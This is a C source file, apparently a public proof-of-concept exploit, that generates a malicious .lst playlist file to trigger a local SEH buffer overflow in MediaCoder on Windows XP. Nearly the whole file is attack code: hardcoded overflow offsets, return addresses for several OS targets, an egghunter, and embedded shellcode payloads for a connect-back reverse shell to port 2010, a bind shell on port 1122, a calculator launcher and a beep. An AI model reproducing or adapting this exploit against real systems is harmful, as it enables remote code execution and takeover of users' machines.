#include<stdio.h>
#include<getopt.h>
#include<string.h>
#include<windows.h>
 
#define PAUSE() getchar()
#define R return
#define V void
#define CONST const
#define STATIC static
#define SIZE(a) strlen(a)
#define FOR(i,a,b) for(i=a;i<b;++i)
#define IFeq(a,b) if(a==b)
#define IFless(a,b) if(a<b)
#define IFgreat(a,b) if(a>b)
#define IFnot(a) if(!a)
#define fisier FILE
#define nul NULL
#define SPLIT(a) exit(a)
#define VER "0.7.3 build 4612 PSP edition"
#define POCNAME "MediaCoder .lst file local buffer overflow exploit"
#define AUTHOR "fl0 fl0w"
#define IFn(a,b) if(a!=b)
#define String_lengh 0x2FC
#define EIP_OFFSET 0x300
#define NOP_OFFSET 0x304
#define EGGHUNTER_OFFSET 0x318
#define JUNK_OFFSET 0x34A
#define TAG_OFFSET 0x81C
#define SHELL_OFFSET 0x824
#define NSEH_OFFSET 0x2FC
#define STOP break
#define NOP "\x90\x90\x90\x90\x90"  \
            "\x90\x90\x90\x90\x90"  \
            "\x90\x90\x90\x90\x90"  \
            "\x90\x90\x90\x90\x90"
  typedef char i8;
  typedef short i16;
  typedef int i32;
  enum {True=1,False=0,Error=-1};
  size_t len(const i8*);
  i32 fwt(CONST V*,i32,i32,fisier*);
  i32 mcpy(V*,CONST V*,i32);
  i32 mset(V*,i32,i32);
  i32 prinf(fisier*,CONST i8*,i8*);
  i32 strcp(CONST i8*,CONST i8*);
  V print(i8*);
  DWORD getFsize(fisier*,i8*);
  V gen_random(i8*,CONST i32);
  DWORD SearchStream(CONST i8*,size_t,CONST i8*,size_t);
  DWORD Findpopopret(V);
  i32 stncmp(CONST i8*,CONST i8*,i32);
  V help();
  i32 closef(fisier*);
  fisier* openf(CONST i8*,CONST i8*,fisier*);
        char BeeP[]={
                    "\x55\x89\xE5\x83\xEC\x18\xC7\x45\xFC"
                    "\x6F\x7A\x83\x7C"
                    "\xC7\x44\x24\x04\xD0\x07\x00\x00\xC7\x04\x24"
                    "\x01\x0E\x00\x00\x8B\x45\xFC\xFF\xD0\xC9\xC3"
                    };
       char ConnectBack[]={ /*ConnectBack 127.0.0.1 port 2010*/
            "\x31\xc9\xbd\xcb\xe3\xbf\xf7\xb1\x4f\xd9\xc8\xd9\x74\x24\xf4"
            "\x5f\x31\x6f\x10\x83\xc7\x04\x03\x6f\x0c\x29\x16\x43\x1f\x24"
            "\xd9\xbc\xe0\x56\x53\x59\xd1\x44\x07\x29\x40\x58\x43\x7f\x69"
            "\x13\x01\x94\xfa\x51\x8e\x9b\x4b\xdf\xe8\x92\x4c\xee\x34\x78"
            "\x8e\x71\xc9\x83\xc3\x51\xf0\x4b\x16\x90\x35\xb1\xd9\xc0\xee"
            "\xbd\x48\xf4\x9b\x80\x50\xf5\x4b\x8f\xe9\x8d\xee\x50\x9d\x27"
            "\xf0\x80\x0e\x3c\xba\x38\x24\x1a\x1b\x38\xe9\x79\x67\x73\x86"
            "\x49\x13\x82\x4e\x80\xdc\xb4\xae\x4e\xe3\x78\x23\x8f\x23\xbe"
            "\xdc\xfa\x5f\xbc\x61\xfc\x9b\xbe\xbd\x89\x39\x18\x35\x29\x9a"
            "\x98\x9a\xaf\x69\x96\x57\xa4\x36\xbb\x66\x69\x4d\xc7\xe3\x8c"
            "\x82\x41\xb7\xaa\x06\x09\x63\xd3\x1f\xf7\xc2\xec\x40\x5f\xba"
            "\x48\x0a\x72\xaf\xea\x51\x1b\x1c\xc0\x69\xdb\x0a\x53\x19\xe9"
            "\x95\xcf\xb5\x41\x5d\xc9\x42\xa5\x74\xad\xdd\x58\x77\xcd\xf4"
            "\x9e\x23\x9d\x6e\x36\x4c\x76\x6f\xb7\x99\xd8\x3f\x17\x72\x98"
            "\xef\xd7\x22\x70\xfa\xd7\x1d\x60\x05\x32\x28\xa7\x92\xc2\x2b"
            "\x27\x62\x55\x2e\x27\x63\x7f\xa7\xc1\x01\x6f\xee\x5a\xbe\x16"
            "\xab\x10\x5f\xd6\x61\xb0\xfc\x45\xee\x40\x8a\x75\xb9\x17\xdb"
            "\x48\xb0\xfd\xf1\xf3\x6a\xe3\x0b\x65\x54\xa7\xd7\x56\x5b\x26"
            "\x95\xe3\x7f\x38\x63\xeb\x3b\x6c\x3b\xba\x95\xda\xfd\x14\x54"
            "\xb4\x57\xca\x3e\x50\x21\x20\x81\x26\x2e\x6d\x77\xc6\x9f\xd8"
            "\xce\xf9\x10\x8d\xc6\x82\x4c\x2d\x28\x59\xd5\x5d\x63\xc3\x7c"
            "\xf6\x2a\x96\x3c\x9b\xcc\x4d\x02\xa2\x4e\x67\xfb\x51\x4e\x02"
            "\xfe\x1e\xc8\xff\x72\x0e\xbd\xff\x21\x2f\x94"
            };
       char Bindport1122[]={
                           "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
                           "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
                           "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
                           "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
                           "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e"
                           "\x4d\x54\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x48"
                           "\x4e\x36\x46\x52\x46\x32\x4b\x38\x45\x54\x4e\x53\x4b\x38\x4e\x37"
                           "\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x54\x4a\x31\x4b\x48"
                           "\x4f\x35\x42\x52\x41\x30\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48"
                           "\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
                           "\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"
                           "\x46\x4f\x4b\x33\x46\x45\x46\x32\x4a\x32\x45\x37\x45\x4e\x4b\x48"
                           "\x4f\x55\x46\x32\x41\x50\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x44"
                           "\x4b\x58\x4f\x45\x4e\x31\x41\x30\x4b\x4e\x43\x30\x4e\x32\x4b\x58"
                           "\x49\x38\x4e\x36\x46\x52\x4e\x41\x41\x56\x43\x4c\x41\x33\x4b\x4d"
                           "\x46\x56\x4b\x38\x43\x34\x42\x53\x4b\x38\x42\x44\x4e\x30\x4b\x48"
                           "\x42\x47\x4e\x51\x4d\x4a\x4b\x58\x42\x34\x4a\x30\x50\x45\x4a\x46"
                           "\x50\x38\x50\x44\x50\x30\x4e\x4e\x42\x55\x4f\x4f\x48\x4d\x48\x56"
                           "\x43\x55\x48\x36\x4a\x36\x43\x33\x44\x33\x4a\x46\x47\x57\x43\x57"
                           "\x44\x43\x4f\x45\x46\x35\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
                           "\x4e\x4f\x4b\x43\x42\x45\x4f\x4f\x48\x4d\x4f\x55\x49\x58\x45\x4e"
                           "\x48\x46\x41\x38\x4d\x4e\x4a\x50\x44\x50\x45\x35\x4c\x56\x44\x30"
                           "\x4f\x4f\x42\x4d\x4a\x36\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x55"
                           "\x4f\x4f\x48\x4d\x43\x55\x43\x45\x43\x45\x43\x35\x43\x35\x43\x44"
                           "\x43\x35\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x36\x4a\x36\x46\x50"
                           "\x44\x36\x48\x36\x43\x35\x49\x38\x41\x4e\x45\x49\x4a\x36\x46\x4a"
                           "\x4c\x51\x42\x47\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x31"
                           "\x41\x55\x45\x35\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
                           "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x45\x4f\x4f\x42\x4d"
                           "\x4a\x36\x45\x4e\x49\x44\x48\x58\x49\x54\x47\x55\x4f\x4f\x48\x4d"
                           "\x42\x55\x46\x35\x46\x45\x45\x45\x4f\x4f\x42\x4d\x43\x49\x4a\x46"
                           "\x47\x4e\x49\x47\x48\x4c\x49\x37\x47\x55\x4f\x4f\x48\x4d\x45\x35"
                           "\x4f\x4f\x42\x4d\x48\x46\x4c\x46\x46\x46\x48\x36\x4a\x46\x43\x56"
                           "\x4d\x36\x49\x38\x45\x4e\x4c\x36\x42\x35\x49\x45\x49\x32\x4e\x4c"
                           "\x49\x38\x47\x4e\x4c\x56\x46\x34\x49\x58\x44\x4e\x41\x43\x42\x4c"
                           "\x43\x4f\x4c\x4a\x50\x4f\x44\x44\x4d\x52\x50\x4f\x44\x54\x4e\x52"
                           "\x43\x39\x4d\x58\x4c\x57\x4a\x53\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"
                           "\x44\x57\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x57\x46\x34\x4f\x4f"
                           "\x48\x4d\x4b\x45\x47\x55\x44\x45\x41\x45\x41\x35\x41\x45\x4c\x56"
                           "\x41\x50\x41\x45\x41\x55\x45\x55\x41\x55\x4f\x4f\x42\x4d\x4a\x36"
                           "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x36"
                           "\x4f\x4f\x4f\x4f\x47\x53\x4f\x4f\x42\x4d\x4b\x58\x47\x35\x4e\x4f"
                           "\x43\x58\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
                           "\x4a\x56\x42\x4f\x4c\x38\x46\x30\x4f\x35\x43\x35\x4f\x4f\x48\x4d\x4f\x4f\x42\x4d\x5a"
                           };
      i8 Calculator[]={
                      "\xba\x20\xf0\xfd\x7f\xc7\x02\x4c\xaa\xf8\x77\x33\xC0\x50\x68\x63\x61\x6C\x63"
                      "\x54\x5B\x50\x53\xB9\xC7\x93\xC2\x77\xFF\xD1\xEB\xF7"
                      };
       i8 egghunter[]={/*IsBadReadPtr egghunter 32 bytes*/
                      "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
                      "\x66\x6C\x30\x77" //fl0w tag
                      "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
                      };
       i8 tag[]={"\x66\x6C\x30\x77"
                 "\x66\x6C\x30\x77"
                };
        i32 j,i,x,custom=0,err;
        i8 c,shellbuffer[0x3E8],fbuffer[0xF4240],retcode[10];
        DWORD ret;
  i32 main(i32 argc,i8** argv)
  { ((argc==7)||(argc==8)&&(atoi(argv[4])>0)&&(atoi(argv[6])>0)&&(atoi(argv[4])<6)||(argc==8)&&(atoi(argv[7])==4))?(err=True):(err=Error);
      IFeq(err,True){
          ((strcp(argv[1],"-f")==0)&&(len(argv[1])==2)&&(strcp(argv[3],"-s")==0)&&(len(argv[3])==2)&&(strcp(argv[5],"-t")==0)&&(len(argv[5])==2))?(err=True):(err=Error);
       IFeq(err,True){
      (atoi(argv[6])==1)?(mcpy(&ret,"\x26\x59\x01\x66",4)):(atoi(argv[6])==2)?(mcpy(&ret,"\xB8\x15\xD1\x72",4)):(atoi(argv[6])==3)?(mcpy(&ret,"\x83\x27\x90\x7C",4)):(atoi(argv[6])==4)?(custom=1):(custom=0);
                 IFeq(custom,1){
                   if((strncmp(argv[7],"0x",(sizeof(i8)*2))==0)&&(len(argv[7])==10)){
                       for(j=(sizeof(char) * 8) - 1; (j >= 0);j--) {
                                 c = *(argv[1] + j + 2);
    ((c>=48)&&(c<=57)||(c>=65)&&(c<=70)||(c>=97)&&(c<=102))?(err=1):(err=-1);
                                                         }
                                sscanf(argv[7],"%x",&ret);
                                                                                  }
                             else
                                  print("syntax error 0x not found");
                      }
                             }
                                                            else
                                                                   print("syntax error ,target must be in range[1-4]");
                      }
                         else {
                              system("cls");
                              printf("[#]%s\n[#]Ver %s\n[#]Author %s\n",POCNAME,VER,AUTHOR);
                              help();
                              }
     switch(atoi(argv[4])){
             case 1: mcpy(shellbuffer,ConnectBack,SIZE(ConnectBack));
                       STOP;
             case 2: mcpy(shellbuffer,Bindport1122,0x2C5);
                       STOP;
             case 3: mcpy(shellbuffer,Calculator,0x20);
                       STOP;
             case 4: mcpy(shellbuffer,BeeP,0x13);
                       STOP;
                            }
      gen_random(fbuffer,String_lengh);
      mcpy(fbuffer+NSEH_OFFSET,"\xEB\x06\x90\x90",4);
      mcpy(fbuffer+EIP_OFFSET,&ret,4);
      mcpy(fbuffer+NOP_OFFSET,NOP,0x14);
      mcpy(fbuffer+EGGHUNTER_OFFSET,egghunter,0x20);
      mset(fbuffer+JUNK_OFFSET,0x58,0x4D2);
      mcpy(fbuffer+TAG_OFFSET,tag,8);
      mcpy(fbuffer+SHELL_OFFSET,shellbuffer,len(shellbuffer));
 
      fisier* f=fopen(argv[2],"wb");
      fwt(fbuffer,1,0x824+len(shellbuffer),f);
      closef(f);
      PAUSE();
      print("DONE!");
      printf("[!]File is %d bytes",getFsize(f,argv[2]));
      R 0;
      }
 
   size_t len(CONST i8* str)
    { CONST i8* aux=str;
      R SIZE(aux);
           }
   i32 fwt(CONST V* ptr,i32 sz,i32 elem,fisier* fname)
   { CONST V* p=ptr;
     R fwrite(p,sz,elem,fname);
       }
    i32 mcpy(V* dest,CONST V* source,i32 len)
   { V* D=dest;
     CONST* S=source;
     len=SIZE(source);
     memcpy(D,S,len);
     R len;
       }
     i32 mset(V* ptr,i32 val,i32 len)
   { V* f=ptr;
     i32 valoare=val;
     memset(f,val,len);
     R len;
   }
   i32 prinf(fisier* str,CONST i8* format,i8* buffer)
    { fisier* f=str;
      CONST i8* fm=format;
      R fprintf(f,fm,buffer);
    }
     i32 strcp(CONST i8* str1,CONST i8* str2)
   { CONST i8* s1=str1;
     CONST i8* s2=str2;
     R strcmp(s1,s2);
   }
   i32 stncmp(CONST i8* str1,CONST i8* str2,i32 num)
    { CONST i8* s1=str1;
      CONST i8* s2=str2;
      R strncmp(s1,s2,num);
        }
   V print(i8* msg)
    {
       printf("[*]%s\n",msg);
    }
    V gen_random(i8* s,CONST i32 len)
    { i32 i;
      STATIC CONST i8 alphanum[]= {
      "0123456789ABCDEFGHIJKLMNOPQRST"
      "UVWXYZabcdefghijklmnopqrstuvwxyz"};
      FOR(i,0,len)
      {
        s[i]=alphanum[rand()%(sizeof(alphanum)-1)];
      }
       s[len]=0;
      }
       V help()
     {  i8 h[]=
     "***************************************************************************\n"
     "* syntax: [-f<file.m3u>] [-s<shellcode>]  [-t<target>] 0xFFFFFFFF         *\n"
     "*  -f      filename                                                       *\n"
     "*  -s      shellcode  to run    [1,5]                                     *\n"
     "*  -t       target              [1,4]                                     *\n"
     "*  example: mediac.exe -f vuln.lst -s 2 -t 1                              *\n"
     "*           mediac.exe -f vuln.lst -s 4 0xFFFFFFFF                        *\n"
     "*  Shellcode 1.ConnectBack 127.0.0.1 port 2010                            *\n"
     "*            2.Bindport1122                                               *\n"
     "*            3.Calculator                                                 *\n"
     "*            4.BeeP                                                       *\n"
     "*  Targets   1.Universal                                                  *\n"
     "*            2.Windows xp sp2 en kernel32.dll                             *\n"
     "*            3.Windows sp3 en ntdll.dll                                   *\n"
     "*            4.Windows xp sp1 en                                          *\n"
     "***************************************************************************\n";
          printf("%s",h);}
     DWORD getFsize(fisier* g,i8* gname)
    {        DWORD s;
             g=fopen(gname,"rb");
             IFeq(g,NULL)
             {
             print("File error at reading");
             exit(0);
             }
             fseek(g,0,SEEK_END);
             s=ftell(g);
             R s;}
     i32 closef(fisier* stream)
     {   fisier* f=stream;
         R fclose(f);
     }